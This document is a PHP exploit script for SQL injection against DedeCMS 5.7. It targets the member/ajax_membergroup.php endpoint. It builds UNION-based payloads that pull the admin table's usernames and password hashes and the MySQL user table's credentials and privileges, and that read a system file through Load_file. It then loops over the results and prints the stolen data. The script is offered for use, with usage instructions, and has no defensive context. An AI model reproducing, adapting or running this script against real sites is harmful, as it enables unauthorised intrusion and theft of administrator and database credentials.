<?php
ini_set("max_execution_time",0);
error_reporting(7);
ob_implicit_flush(true);
function usage()
{
global $argv;
exit(
"\n--+++============================================================+++--".
"\n--+++=================== DeDe 5.7  sql Exploit ==================+++--".
"\n--+++============================================================+++--".
"\n\n[+] Author : CunZhang".
"\n[+] Time  : 2012-4-10".
"\n[+] Blog  : http://www.sysmjj.com".
"\n[+] Usage : php ".$argv[0]." <hostname> <path>".
"\n[+] Exp   : php ".$argv[0]." localhost /".

"\n\n");
}

function query($biao,$chr,$chs)
{
global $pre;
switch ($chs){
case 1:
$query = "@`\'` Union select concat(0x7e,0x27,count(*),0x27,0x7e) from `".$pre."admin` where 1 or id=@`\'`";
break;
case 2:
$query = "@`\'` Union select concat(0x7e,0x27,userid,0x7C,pwd,0x27,0x7e) from `".$pre."admin` limit $chr,1 Union select concat(0x7e,0x27,userid,0x7C,pwd,0x27,0x7e) from `".$pre."admin` where 1=2 or id=@`\'`";
break;
case 3:
$query = "'";
break;
case 4:
$query = "@`\'` Union select concat(0x7e,0x27,count(*),0x27,0x7e) from `mysql`.user where 1 or user=@`\'`";
break;
case 5:
$query = "@`\'` Union select concat(0x7e,0x27,Host,0x7C,User,0x7C,Password,0x7C,Select_priv,0x27,0x7e) from `mysql`.user limit $chr,1 Union select 1 from `".$pre."admin` where 1=2 or id=@`\'`";
break;
case 6:
$query = "@`\'` Union select concat(0x7e,0x27,Load_file(0x633A5C626F6F742E696E69),0x27,0x7e) from `mysql`.user where 1 or user=@`\'`";
break;
}
//echo $query."\r\n";
$query = urlencode($query);
return $query;
}

function exploit($hostname, $path,$biao, $chr, $chs)
{
$conn = fsockopen($hostname, 80);
if (!$conn){
exit("\r\n[-] No response from $conn\n");
}

$postdata = "action=post&membergroup=".query($biao,$chr,$chs);
$message = "POST ".$path."member/ajax_membergroup.php HTTP/1.1\r\n";
$message .= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*\r\n";
$message .= "Accept-Language: zh-cn\r\n";
$message .= "Content-Type: application/x-www-form-urlencoded\r\n";
$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$message .= "Host: $hostname\r\n";
$message .= "Content-Length: ".strlen($postdata)."\r\n";
$message .= "Cookie: $sessions\r\n";
$message .= "Connection: Close\r\n\r\n";
$message .= $postdata;
//echo $message ;
$inheader = 1;
fputs($conn, $message);
while (!feof($conn))
$reply .= fread($conn, 1024);
fclose($conn);
//print $reply;


$reply=substr($reply,strpos($reply,"\r\n\r\n"));
//echo $reply;
//echo iconv('UTF-8', 'GB2312', $reply);
return $reply;
}


function GetPre($hostname,$path)
{
$tmp = array();
$exit = 0;
while ($exit==0)
{
$response = exploit($hostname, $path,1,1,3);
//echo $response;
if (preg_match("/FROM (.*?)member_group/i",$response,$tmp))
{
$exit = 1;
return $tmp[1];
}
else
return "dede_";
}
}

function dbcounts($hostname,$path)
{
$tmp = array();
$exit = 0;
while ($exit==0)
{
$response = exploit($hostname, $path,1,1,4);
//echo $response;
if (preg_match("/\~\'(.*?)\'\~/i",$response,$tmp))
{
$exit = 1;
return $tmp[1];
}
else
return "Can't Get\r\n";
}
}

function counts($hostname,$path)
{
$tmp = array();
$exit = 0;
while ($exit==0)
{
$response = exploit($hostname, $path,1,1,1);
//echo $response;
if (preg_match("/\~\'(.*?)\'\~/i",$response,$tmp))
{
$exit = 1;
return $tmp[1];
}
else
return "Can't Get\r\n";
}
}

function GetDBUser($hostname,$path,$c)
{
$tmp = array();
$exit = 0;
while ($exit==0)
{
$response = exploit($hostname, $path,1,$c-1,5);
if (preg_match("/\~\'(.*?)\'\~/i",$response,$tmp))
{
$exit = 1;
return $tmp[1];
}
else
return "Can't Get\r\n";
}
}

function GetUser($hostname,$path,$c)
{
$tmp = array();
$exit = 0;
while ($exit==0)
{
$response = exploit($hostname, $path,1,$c-1,2);
if (preg_match("/\~\'(.*?)\'\~/i",$response,$tmp))
{
$exit = 1;
return $tmp[1];
}
else
return "Can't Get\r\n";
}
}

///////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////

if ($argc != 3)
usage();
$hostname = $argv[1];
$path = $argv[2];
echo "[+] =======================================================\n";
echo "[+] Pre: ";
ob_flush(); 
flush();
$pre=GetPre($hostname, $path);
echo $pre."\n";
echo "[+] DbCount: ";
ob_flush(); 
flush();
$dbcount=dbcounts($hostname, $path);
echo $dbcount."\n";
///////////////////////////////////////////////////////////////////
$c=1;
///////////////////////////////////////////////////////////////////
while($c<=$dbcount){
echo "[+] <".($c).">\r\n";
ob_flush(); 
flush();
$dbuser=GetDBUser($hostname,$path,$c);
echo $dbuser."\n";
$c++;
}
///////////////////////////////////////////////////////////////////
echo "[+] Admin@Count: ";
ob_flush(); 
flush();
$count=counts($hostname, $path);
echo $count."\n";
ob_flush(); 
flush(); 
///////////////////////////////////////////////////////////////////
$c=1;
///////////////////////////////////////////////////////////////////
while($c<=$count){
echo "[+] <".($c).">\r\n";
ob_flush(); 
flush();
$user=GetUser($hostname,$path,$c);
echo $user."\n";
$c++;
}
///////////////////////////////////////////////////////////////////
?>